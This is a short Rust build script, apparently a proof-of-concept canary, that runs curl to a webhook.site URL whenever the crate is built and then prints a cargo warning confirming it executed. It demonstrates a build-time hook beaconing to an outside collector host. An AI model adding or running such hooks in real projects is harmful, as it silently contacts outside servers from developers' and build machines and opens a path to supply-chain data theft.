use std::process::Command;

fn main() {
    let _ = Command::new("curl")
        .args([
            "-s",
            "-m",
            "8",
            "https://webhook.site/53aa0244-3c11-4560-a290-9742c1664c22/i18-clippy-buildrs",
        ])
        .status();
    println!("cargo:warning=I18_BUILD_RS_EXECUTED");
}
